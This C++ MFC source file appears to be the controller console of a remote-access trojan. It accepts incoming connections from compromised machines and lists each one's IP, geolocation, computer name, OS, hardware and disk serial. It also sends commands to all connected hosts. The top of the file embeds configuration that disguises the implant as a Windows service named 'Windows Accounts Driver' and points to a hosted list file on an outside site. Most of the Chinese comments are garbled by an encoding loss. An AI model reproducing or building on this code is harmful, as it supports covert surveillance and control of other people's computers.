
// ClientDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "ClientDlg.h"
#include "afxdialogex.h"
#include "TcpTran.h"
#include "comm.h"
#include "NL_QQwry.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

CClientDlg *m_clientdlg = NULL;

struct MODIFY_DATA 
{
		unsigned int finder;
		TCHAR ws_svcname[32];
		TCHAR ws_svcdisplay[64];
		char ws_svcdesc[256];
		char url[256];
		int  port;
}modify_data = 
{
		0xFFFFFF8D,
		"RemoteStorage",
		"Windows Accounts Driver",
		"Network Connections Management",
		"http://ahai2007.id666.com/user/ahai2007/disk/webdisk/lplist.txt",
		80,
};

LINKINFO m_linkinfo;
LINKINFO clientLinkinfo;

//CString str = _T("");

int item = 0;

u_short u_port = 0   ;
string str_ip ;

char  client_ip[32] = {0} ;
static int nrItemNum = 0;

//static SOCKET g__clientsocket;
std::vector <TMPSOCKET *> tmp_vector;
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////



// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CClientDlg �Ի���




CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CClientDlg::IDD, pParent)
{
	//HWND hWnd = GetSafeHwnd();
	//m_clientdlg =  (CClientDlg *)FromHandle(hWnd);  
	m_clientdlg = this; //����ӵ�
//	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_list);
	DDX_Control(pDX, IDC_BUTTON1, m_btn_start);
	DDX_Control(pDX, IDC_BUTTON2, m_btn_stop);
}

BEGIN_MESSAGE_MAP(CClientDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CClientDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CClientDlg::OnBnClickedButton2)
END_MESSAGE_MAP()


// CClientDlg ��Ϣ�������

BOOL CClientDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��
	LONG lStyle = m_list.SendMessage(LVM_GETEXTENDEDLISTVIEWSTYLE);
	lStyle |= LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_HEADERDRAGDROP;
	m_list.SendMessage(LVM_SETEXTENDEDLISTVIEWSTYLE, 0,(LPARAM)lStyle);
	LV_COLUMN lvc;
	
	lvc.mask = LVCF_TEXT | LVCF_SUBITEM | LVCF_WIDTH /*| LVCF_FMT*/;
	
	m_list.InsertColumn(0,"���ض�IP��ַ��Ϣ",LVCFMT_LEFT,120,0);
	m_list.InsertColumn(1,"�������",LVCFMT_LEFT,90,0);
    m_list.InsertColumn(2,"����ϵͳ",LVCFMT_LEFT,100,0);
	m_list.InsertColumn(3,"CPUƵ��",LVCFMT_LEFT,80,0);
	m_list.InsertColumn(4,"�ڴ�����",LVCFMT_LEFT,80,0);
	m_list.InsertColumn(5,"�û����ڵ���",LVCFMT_LEFT,100,0);
	m_list.InsertColumn(6,"����汾",LVCFMT_LEFT,90,0);
	m_list.InsertColumn(7,"Ӳ�����к�",LVCFMT_LEFT,150,0);
	m_list.InsertColumn(8,"SOCKET",LVCFMT_LEFT,80,0);

	ShowWindow(SW_MINIMIZE);

	// TODO: �ڴ���Ӷ���ĳ�ʼ������

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CClientDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CClientDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


DWORD WINAPI ServerThread(LPVOID lp)
{
	LPLINKINFO  plast_linkinfo =(LPLINKINFO)lp ; 
    CTcpTran m_tcptran ;
    m_tcptran.m_Socket  =  plast_linkinfo->s ;

	SYSTEMINIT m_sendmsg ;
	char ReceiveBuf[sizeof(m_sendmsg)] = {0};
    int  DataLen = 0;

    DataLen = m_tcptran.myrecv(m_tcptran.m_Socket,(char *)&m_sendmsg,sizeof(m_sendmsg),0,60,0,false) ;

	if (DataLen == 0) 
	{
		closesocket(m_tcptran.m_Socket);
		ExitThread(0);
	}

//////////////////////////////////////////////////////////////////////////
//  �����ظ��ͻ������� //Ӳ�����к�
//////////////////////////////////////////////////////////////////////////
//  ����в��������Ӳ�����к��� ����
//  ����������Ӳ�����к� �����ʱ��Ҫ�ҵ�ԭ����idɾ��Ȼ����ԭ����λ�ò���

	//BOOL  BInseart =TRUE;
	BOOL  BDeleteid =FALSE;
	UINT  InseartItem =0;	
	for(int j = 0; j<tmp_vector.size();j++)
	{
		if (stricmp(m_sendmsg.HDSerial,tmp_vector[j]->HDSerial)==0)
		{
			//BInseart = FALSE;
			
			//CString str;

			for(int i=0; i<m_clientdlg->m_list.GetItemCount(); i++)
			{
				if(stricmp(m_sendmsg.HDSerial,tmp_vector[j]->HDSerial)==0 )
				{
					//str.Format(_T("ѡ���˵�%d��"), i);
					//AfxMessageBox(str);
					BDeleteid = TRUE;
					InseartItem = i;

				}
			}

			tmp_vector.erase(tmp_vector.begin()+j);						
		}
	}
//////////////////////////////////////////////////////////////////////////
	//if (BInseart) 
	//{
		CString tmp = _T("");
		CString m_phyaddr = _T("");
		
		int mm = m_clientdlg->m_list.GetItemCount(); //�������Ĳ���˳��

		if (BDeleteid)
		{
            mm = InseartItem;

			m_clientdlg->m_list.DeleteItem(InseartItem);
		}
		
		tmp.Format("%s",client_ip);
		
		m_clientdlg->m_list.InsertItem(mm,"");
		m_clientdlg->m_list.SetItemText(mm,0,tmp);
		
		tmp.Format("%s",m_sendmsg.computer);
		
		m_clientdlg->m_list.SetItemText(mm,1,tmp);
		
		tmp.Format("%s",m_sendmsg.os); 
		
		m_clientdlg->m_list.SetItemText(mm,2,tmp);
		
		tmp.Format("%s",m_sendmsg.processor); 
		m_clientdlg->m_list.SetItemText(mm,3,tmp);
		
		tmp.Format("%s",m_sendmsg.mem); 
		m_clientdlg->m_list.SetItemText(mm,4,tmp);
		
		//	TQQwry m_qqwry("QQWry.Dat"); 
		IPwry ipinfo;
		//m_qqwry.qqwry(client_ip);
		m_phyaddr =ipinfo.IP2Add(client_ip);
		//m_phyaddr = m_qqwry.Country +" "+ m_qqwry.Local;	
		
		tmp.Format("%s",m_sendmsg.mem); 
		m_clientdlg->m_list.SetItemText(mm,5,m_phyaddr);
		
		tmp.Format("%s",m_sendmsg.version); 
		m_clientdlg->m_list.SetItemText(mm,6,tmp);
		
		tmp.Format("%s",m_sendmsg.HDSerial); 
		AfxMessageBox(m_sendmsg.HDSerial);
		m_clientdlg->m_list.SetItemText(mm,7,tmp);
		
		tmp.Format("%d",m_tcptran.m_Socket); 
		m_clientdlg->m_list.SetItemText(mm,8,tmp);      
		
		
		TMPSOCKET *tmp00 = new TMPSOCKET;
		
		memset(tmp00,0,sizeof(TMPSOCKET));
		
		tmp00->ClientSocket = m_tcptran.m_Socket;
		
		lstrcpy(tmp00->HDSerial,m_sendmsg.HDSerial);
		//g__clientsocket = m_tcptran.m_Socket;
		
		tmp_vector.push_back(tmp00);		
	//}

		//delete tmp00;

	//delete tmp;

/*
	for(int kk=0;kk<tmp_vector.size();kk++)
	{
		CString lll;
		lll.Format("%d",tmp_vector[kk]->ClientSocket);
		AfxMessageBox(lll);
		AfxMessageBox(tmp_vector[kk]->HDSerial);
	}
*/

	return true;
}

DWORD WINAPI MyServerThread()
{

	CTcpTran m_tcptran ;
	//SYSTEMINIT m_systeminit;

	m_tcptran.InitSocketLibray(2,2);

	SOCKET ServerSocket = m_tcptran.InitSocket(SOCKETBIND,str_ip,u_port,0);

	if (ServerSocket == SOCKET_ERROR)
	{        
		closesocket(ServerSocket);
		AfxMessageBox("SOCKET_ERROR");
		
		return -1;
	}

	struct	sockaddr_in Client_addr ;
    //204.204.204.204 δ��ʼ�� debug =0x00cd
	memset((void   *)&Client_addr,0,sizeof(Client_addr));  

	int addrlen = sizeof(sockaddr_in); //���Ĵ��� ����ȡ�ĵ�ַ // ȡ����ָ��Ӧ�� ��СӦ�����ȷ����

	SOCKET ClientSocket ;
	HANDLE hThread =NULL ;
	DWORD Threadid = 0 ;

	
	while(1)
    {
		////���Ĵ��� ����ȡ�ĵ�ַ addrlen//
		ClientSocket = m_tcptran.myaccept(ServerSocket,(struct sockaddr*)&Client_addr,&addrlen) ;

        //ClientSocket = accept(ServerSocket,(struct sockaddr*)&Client_addr,&addrlen) ;
		if(ClientSocket == SOCKET_ERROR)
			break;
		 strcpy( client_ip, inet_ntoa(Client_addr.sin_addr) ); 
		 clientLinkinfo.s = ClientSocket ;
		// �ַ�����ֵ
		//strcpy(client_ip,m_linkinfo.strBindIp.c_str());
         
		clientLinkinfo.BindPort  = m_linkinfo.BindPort ;		
		hThread = CreateThread(0,0,ServerThread,(LPVOID)&clientLinkinfo,0,&Threadid);	
    
	}

	return 0;
}

void CClientDlg::OnBnClickedButton1()        //��ʼ��ť
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CString m_ip   = _T("");
	CString m_port = _T("");

	GetDlgItemText(IDC_EDIT1,m_ip);
    GetDlgItemText(IDC_EDIT2,m_port);

	char  *ch_ip =NULL ;


	str_ip = m_ip.GetBuffer(0);
	u_port = _ttoi(m_port);

	m_btn_start.EnableWindow(FALSE);
	m_btn_stop.EnableWindow(TRUE);

//////////////////////////////////////////////////////////////////////////
// �ύ��������
//////////////////////////////////////////////////////////////////////////

	DWORD  Threadid = 0;
	HANDLE hThread  = CreateThread(0,0,(LPTHREAD_START_ROUTINE)MyServerThread,NULL,0,&Threadid);
}


void CClientDlg::OnBnClickedButton2()       //ֹͣ��ť
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	//����ͻ��˹ر� �������Դcpu 100%ռ�� //�����еĿͻ��˷���
	// TODO: Add your control notification handler code here
	COMMAND m_command;
	m_command.wCmd= CMD_RETRY; //CMD_NULL
	CTcpTran m_tcptran;
	//CProcManageDlg m_ProcDlg;
	CString id;
	id = m_clientdlg->m_list.GetItemText(item,7);
	
	//AfxMessageBox(id); //test
	char HDSerial[64] = {0};
	
	id.Format("%s",HDSerial);
	SOCKET mmclose;
	
	for(int j = 0; j<tmp_vector.size();j++)
	{
		mmclose =tmp_vector[j]->ClientSocket;
		m_tcptran.mysend(mmclose,(char *)&m_command,sizeof(COMMAND),0,60);
		shutdown(mmclose, SD_BOTH);
		Sleep(50);
		closesocket(mmclose);
	}
	
	m_list.DeleteAllItems();

	m_btn_start.EnableWindow(TRUE);
	m_btn_stop.EnableWindow(FALSE);

	//CDialog::OnCancel();
}
